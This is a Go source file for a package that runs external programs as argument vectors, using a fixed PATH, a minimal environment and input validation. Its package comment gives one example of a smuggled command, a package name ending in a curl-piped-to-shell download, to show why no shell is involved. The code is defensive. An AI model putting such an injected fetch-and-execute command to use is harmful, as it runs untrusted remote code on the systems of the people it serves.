// SPDX-License-Identifier: Apache-2.0

// Package run executes external programs on behalf of a provider.
//
// Providers are the only part of Datum that runs anything, and they run it as an
// argument vector. Nothing here takes a command line, so there is no shell to misuse. A
// package name of `nginx; curl http://host/x | sh` reaches apt-get as one argument and
// fails as an unknown package.
package run

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"sort"
	"strings"
)

// Path is the PATH every program is looked up in. Fixed, never inherited, so a PATH set
// in the agent's environment cannot redirect apt-get to something else.
const Path = "/usr/sbin:/usr/bin:/sbin:/bin"

// Result is what a program produced.
type Result struct {
	// Argv is kept so an error can say what was run.
	Argv   []string
	Code   int
	Stdout string
	Stderr string
}

// OK reports whether the program exited zero.
func (r Result) OK() bool { return r.Code == 0 }

// Err turns a non-zero exit into an error that says something. A caller that expects a
// non-zero exit, such as a status query, reads Code instead.
func (r Result) Err() error {
	if r.OK() {
		return nil
	}
	detail := firstLine(r.Stderr)
	if detail == "" {
		detail = firstLine(r.Stdout)
	}
	if detail == "" {
		return fmt.Errorf("%s exited %d", r.Argv[0], r.Code)
	}
	return fmt.Errorf("%s exited %d: %s", r.Argv[0], r.Code, detail)
}

// Runner executes a program. A provider takes one so that its tests do not need
// the program, or the operating system it belongs to.
type Runner interface {
	Run(ctx context.Context, argv ...string) (Result, error)
}

// Exec runs programs for real.
type Exec struct {
	// Env is added to the fixed environment, for the few variables a package
	// manager needs.
	Env map[string]string
}

// Run executes argv and collects its output.
//
// The returned error covers failing to run the program at all. A program that ran
// and exited non-zero is a Result with that code, because whether it is a failure
// is the caller's question.
func (e Exec) Run(ctx context.Context, argv ...string) (Result, error) {
	if len(argv) == 0 {
		return Result{}, errors.New("run: no program given")
	}
	if strings.Contains(argv[0], "/") && !strings.HasPrefix(argv[0], "/") {
		// A relative path would resolve against the working directory, which is
		// whatever the agent happened to be started in.
		return Result{}, fmt.Errorf("run: %q must be a bare name or an absolute path", argv[0])
	}

	// Resolved here rather than by exec, which looks a bare name up in the PATH of this
	// process and would ignore the one set below.
	program, err := Lookup(argv[0])
	if err != nil {
		return Result{Argv: argv}, err
	}

	cmd := exec.CommandContext(ctx, program, argv[1:]...)
	cmd.Env = e.environ()
	// A provider never runs anything that reads input, and a program that waits on
	// stdin would otherwise hang the pass.
	cmd.Stdin = nil
	cmd.Dir = "/"

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	result := Result{Argv: argv}
	runErr := cmd.Run()
	result.Stdout = stdout.String()
	result.Stderr = stderr.String()

	// Checked first, because a program the context killed exits by signal and would
	// otherwise be indistinguishable from one that failed on its own.
	if ctxErr := ctx.Err(); ctxErr != nil {
		return result, fmt.Errorf("running %s: %w", strings.Join(argv, " "), ctxErr)
	}

	var exitErr *exec.ExitError
	switch {
	case runErr == nil:
		result.Code = 0
	case errors.As(runErr, &exitErr):
		result.Code = exitErr.ExitCode()
	default:
		return result, fmt.Errorf("running %s: %w", strings.Join(argv, " "), runErr)
	}
	return result, nil
}

// environ builds a minimal environment. Nothing is inherited, so a provider
// behaves the same however the agent was started.
func (e Exec) environ() []string {
	base := map[string]string{
		"PATH": Path,
		// Package managers and their hooks change output and sometimes prompt
		// based on the locale, so it is pinned.
		"LC_ALL": "C",
		"LANG":   "C",
	}
	for k, v := range e.Env {
		base[k] = v
	}
	keys := make([]string, 0, len(base))
	for k := range base {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	out := make([]string, 0, len(keys))
	for _, k := range keys {
		out = append(out, k+"="+base[k])
	}
	return out
}

// With returns a copy of the runner with extra environment variables.
func (e Exec) With(env map[string]string) Exec {
	merged := make(map[string]string, len(e.Env)+len(env))
	for k, v := range e.Env {
		merged[k] = v
	}
	for k, v := range env {
		merged[k] = v
	}
	return Exec{Env: merged}
}

// Lookup resolves a program name against the fixed path, or checks an absolute one.
func Lookup(name string) (string, error) {
	if name == "" {
		return "", errors.New("run: no program given")
	}
	if strings.HasPrefix(name, "/") {
		if executable(name) {
			return name, nil
		}
		return "", fmt.Errorf("run: %s is not an executable file", name)
	}
	if strings.Contains(name, "/") {
		return "", fmt.Errorf("run: %q must be a bare name or an absolute path", name)
	}
	for _, dir := range strings.Split(Path, ":") {
		candidate := dir + "/" + name
		if executable(candidate) {
			return candidate, nil
		}
	}
	return "", fmt.Errorf("run: %s is not on %s", name, Path)
}

// Available reports whether a program is on the fixed path. Provider selection uses
// this instead of asking what distribution it is on.
func Available(name string) bool {
	_, err := Lookup(name)
	return err == nil
}

func executable(path string) bool {
	info, err := os.Stat(path)
	if err != nil || info.IsDir() {
		return false
	}
	return info.Mode().Perm()&0o111 != 0
}

// Word checks that a value can be handed to a program as itself.
//
// Arguments reach a program as a vector, so this is not what stops a shell
// metacharacter. It stops a value a program would read as an option, and a value
// carrying characters that mean something to whatever the program hands it to next.
// kind names the thing for the error message, extra lists the punctuation allowed
// beyond letters and digits.
func Word(kind, value, extra string) error {
	if value == "" {
		return fmt.Errorf("empty %s", kind)
	}
	if strings.HasPrefix(value, "-") {
		return fmt.Errorf("%s %q would be read as an option", kind, value)
	}
	for _, r := range value {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case strings.ContainsRune(extra, r):
		default:
			return fmt.Errorf("%q is not a %s", value, kind)
		}
	}
	return nil
}

func firstLine(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return strings.TrimSpace(s[:i])
	}
	return s
}
